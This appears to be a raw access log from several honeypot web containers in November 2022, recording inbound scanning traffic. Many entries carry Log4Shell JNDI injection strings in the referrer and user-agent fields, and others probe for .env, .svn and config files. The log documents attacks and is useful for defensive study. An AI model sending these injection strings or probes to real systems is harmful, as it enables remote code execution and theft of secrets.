swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
blank-t-2_running | 213.255.16.153 | 17/Nov/2022:11:54:42 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 66.70.154.59 | 17/Nov/2022:11:54:53 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 73.42.244.8 | 17/Nov/2022:11:55:10 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 61.102.42.5 | 17/Nov/2022:11:55:11 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 216.218.206.120 | 17/Nov/2022:11:56:45 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 | y
blank-t-2_running | 80.147.162.151 | 17/Nov/2022:11:57:16 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t-2_running | 222.134.240.91 | 17/Nov/2022:11:59:32 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 216.218.206.104 | 17/Nov/2022:12:00:47 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 | y
blank-t-2_running | 85.53.55.133 | 17/Nov/2022:12:01:06 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 94.102.61.10 | 17/Nov/2022:12:01:22 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 | y
blank-t-2_running | 89.121.228.38 | 17/Nov/2022:12:02:04 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 120.211.227.11 | 17/Nov/2022:12:03:31 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 191.242.182.210 | 17/Nov/2022:12:03:51 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 82.64.113.245 | 17/Nov/2022:12:05:31 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 144.22.191.115 | 17/Nov/2022:12:06:51 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 194.146.24.107 | 17/Nov/2022:12:20:21 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 141.255.166.2 | 17/Nov/2022:12:24:50 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 144.22.191.115 | 17/Nov/2022:12:40:58 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t_running | 195.87.73.208 | 17/Nov/2022:12:01:42 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t_running | 144.22.130.100 | 17/Nov/2022:12:01:48 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
it-t_running | 94.102.61.10 | 17/Nov/2022:12:04:59 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 | y
it-t_running | 61.102.42.5 | 17/Nov/2022:12:09:45 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
it-t_running | 120.236.79.182 | 17/Nov/2022:12:10:39 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
it-t_running | 222.117.95.174 | 17/Nov/2022:12:11:26 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
it-t_running | 141.255.166.2 | 17/Nov/2022:12:20:10 | GET / HTTP/1.1 | - | Hello World | y
it-t_running | 117.16.44.111 | 17/Nov/2022:12:41:03 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t_running | 65.49.20.125 | 17/Nov/2022:12:49:15 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15 | y
it-t-2_running | 167.248.133.44 | 17/Nov/2022:12:14:15 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t-2_running | 167.248.133.44 | 17/Nov/2022:12:14:16 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
it-t-2_running | 167.248.133.44 | 17/Nov/2022:12:14:21 | GET /sites/default/files/favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t-2_running | 167.248.133.44 | 17/Nov/2022:12:14:21 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t-2_running | 101.35.198.225 | 17/Nov/2022:12:29:31 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t_running | 147.182.233.56 | 17/Nov/2022:13:02:09 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 85.105.82.39 | 17/Nov/2022:13:02:13 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t_running | 95.91.13.119 | 17/Nov/2022:13:02:39 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t_running | 222.117.95.174 | 17/Nov/2022:13:08:03 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t_running | 40.87.11.253 | 17/Nov/2022:13:10:22 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 141.255.166.2 | 17/Nov/2022:12:19:30 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 101.35.198.225 | 17/Nov/2022:12:29:31 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 163.172.133.17 | 17/Nov/2022:12:37:14 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t-2_running | 183.136.225.32 | 17/Nov/2022:12:58:00 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
swipe-t-2_running | 167.94.145.57 | 17/Nov/2022:13:02:00 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 167.94.145.57 | 17/Nov/2022:13:02:00 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 167.94.145.57 | 17/Nov/2022:13:02:00 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
swipe-t-2_running | 167.94.145.57 | 17/Nov/2022:13:02:05 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 183.136.225.32 | 17/Nov/2022:13:04:31 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t-2_running | 183.136.225.32 | 17/Nov/2022:13:04:32 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
pwd-t_running | 163.172.133.17 | 17/Nov/2022:12:37:14 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 191.242.188.103 | 17/Nov/2022:13:10:41 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 31.220.1.83 | 17/Nov/2022:13:14:31 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
blank-t_running | 61.102.42.5 | 17/Nov/2022:13:26:15 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 46.101.255.220 | 17/Nov/2022:12:46:25 | \x16\x03\x01 | - | - | n
blank-t-2_running | 46.101.255.220 | 17/Nov/2022:12:46:26 | \x16\x03\x01 | - | - | n
blank-t-2_running | 46.101.255.220 | 17/Nov/2022:12:46:26 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
blank-t-2_running | 137.59.161.30 | 17/Nov/2022:13:14:39 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
blank-t-2_running | 205.169.39.63 | 17/Nov/2022:13:14:53 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
blank-t-2_running | 128.14.134.134 | 17/Nov/2022:13:23:27 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
blank-t-2_running | 31.220.1.83 | 17/Nov/2022:13:29:02 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t_running | 31.220.1.83 | 17/Nov/2022:13:18:11 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t_running | 194.146.24.107 | 17/Nov/2022:13:19:58 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t_running | 109.237.97.180 | 17/Nov/2022:13:21:09 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
it-t_running | 109.237.97.180 | 17/Nov/2022:13:21:09 | \x16\x03\x01\x01H\x01 | - | - | n
blank-t_running | 89.121.228.38 | 17/Nov/2022:13:55:18 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | HEAD / HTTP/1.0 | - | - | n
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /system_api.php HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /c/version.js HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /streaming/clients_live.php HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /stalker_portal/c/version.js HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /stream/live.php HTTP/1.1 | - | VLC/3.0.8 LibVLC/3.0.8 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET /flu/403.html HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 165.227.40.163 | 17/Nov/2022:13:44:10 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
it-t-2_running | 31.220.1.83 | 17/Nov/2022:13:54:17 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:45 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:45 | GET /robots.txt HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:46 | GET /sitemap.xml HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:46 | GET /.well-known/security.txt HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:47 | GET /sites/default/files/favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0 | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:48 | GET /misc/ajax.js HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:48 | GET /CHANGELOG.txt HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:49 | GET /misc/drupal.js HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:50 | GET /misc/tabledrag.js HTTP/1.1 | - | - | y
it-t-2_running | 185.163.109.66 | 17/Nov/2022:14:02:50 | GET /misc/tableheader.js HTTP/1.1 | - | - | y
swipe-t-2_running | 31.220.1.83 | 17/Nov/2022:13:38:50 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 205.169.39.63 | 17/Nov/2022:13:39:03 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t-2_running | 205.169.39.63 | 17/Nov/2022:13:39:03 | GET /main.css HTTP/1.1 | http://128.8.238.140/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t-2_running | 205.169.39.63 | 17/Nov/2022:13:39:03 | GET /university-of-maryland-logo.png HTTP/1.1 | http://128.8.238.140/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t-2_running | 205.169.39.63 | 17/Nov/2022:13:39:03 | GET /dis-logo.png HTTP/1.1 | http://128.8.238.140/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t-2_running | 191.242.188.103 | 17/Nov/2022:13:46:19 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 191.242.188.103 | 17/Nov/2022:13:51:51 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 159.65.242.113 | 17/Nov/2022:13:27:40 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 89.212.123.191 | 17/Nov/2022:13:34:51 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t_running | 91.243.167.21 | 17/Nov/2022:13:34:56 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
swipe-t_running | 118.218.209.149 | 17/Nov/2022:13:35:48 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 129.154.55.234 | 17/Nov/2022:13:36:50 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 113.125.191.234 | 17/Nov/2022:13:36:57 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t_running | 43.242.247.139 | 17/Nov/2022:13:37:48 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t_running | 61.102.42.5 | 17/Nov/2022:13:40:45 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 172.105.77.209 | 17/Nov/2022:13:45:16 | GET /0bef HTTP/1.0 | - | - | y
swipe-t_running | 144.22.191.115 | 17/Nov/2022:13:45:49 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 31.220.1.83 | 17/Nov/2022:13:45:54 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t_running | 27.1.44.56 | 17/Nov/2022:13:48:57 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 143.198.133.234 | 17/Nov/2022:13:52:10 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t_running | 89.121.228.38 | 17/Nov/2022:13:53:06 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t_running | 195.87.73.176 | 17/Nov/2022:13:53:56 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t_running | 118.41.204.72 | 17/Nov/2022:13:54:09 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 222.165.136.99 | 17/Nov/2022:13:54:35 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t_running | 102.141.225.238 | 17/Nov/2022:13:59:40 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 144.22.130.100 | 17/Nov/2022:14:00:33 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 78.187.13.206 | 17/Nov/2022:14:03:41 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t_running | 191.242.188.103 | 17/Nov/2022:14:05:51 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 69.236.215.6 | 17/Nov/2022:14:09:58 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 85.105.82.39 | 17/Nov/2022:14:11:55 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 109.237.98.226 | 17/Nov/2022:13:28:31 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
pwd-t_running | 109.237.98.226 | 17/Nov/2022:13:28:31 | \x16\x03\x01\x01H\x01 | - | - | n
pwd-t_running | 163.172.133.17 | 17/Nov/2022:13:35:50 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 58.209.111.242 | 17/Nov/2022:13:56:11 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:20 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/bootstrap/css/bootstrap.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/directory-tools.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/password-mgmt.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/forgot-password.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/dirid-profile.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/bootstrap/css/datepicker.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/footer.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/css/password-mgmt-dynamic.css HTTP/1.1 | http://128.8.238.49/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/images/header-background.gif HTTP/1.1 | http://128.8.238.49/resources/css/directory-tools.css | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/images/body-bg.gif HTTP/1.1 | http://128.8.238.49/resources/css/directory-tools.css | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 65.154.226.166 | 17/Nov/2022:13:56:21 | GET /resources/images/dis_logo.png HTTP/1.1 | http://128.8.238.49/resources/css/footer.css | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
pwd-t_running | 61.147.15.65 | 17/Nov/2022:14:00:58 | \x16\x03\x01 | - | - | n
pwd-t_running | 61.147.15.65 | 17/Nov/2022:14:01:54 | GET /favicon.ico HTTP/1.1 | - | Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K) | y
pwd-t_running | 61.147.15.67 | 17/Nov/2022:14:02:09 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27 | y
pwd-t_running | 65.141.6.170 | 17/Nov/2022:14:02:15 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
pwd-t_running | 65.141.6.170 | 17/Nov/2022:14:02:15 | POST / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | n
pwd-t_running | 61.147.15.67 | 17/Nov/2022:14:02:30 | GET / HTTP/1.1 | - | Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K) | y
pwd-t_running | 61.147.15.67 | 17/Nov/2022:14:02:33 | \x16\x03\x01 | - | - | n
pwd-t_running | 61.147.15.65 | 17/Nov/2022:14:02:37 | GET / HTTP/1.1 | - | Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01 [et] | y
pwd-t_running | 61.147.15.67 | 17/Nov/2022:14:02:55 | \x16\x03\x01 | - | - | n
pwd-t_running | 118.41.204.72 | 17/Nov/2022:14:12:32 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t_running | 222.117.95.174 | 17/Nov/2022:14:26:16 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 118.218.209.149 | 17/Nov/2022:14:06:25 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 94.177.20.162 | 17/Nov/2022:14:08:31 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
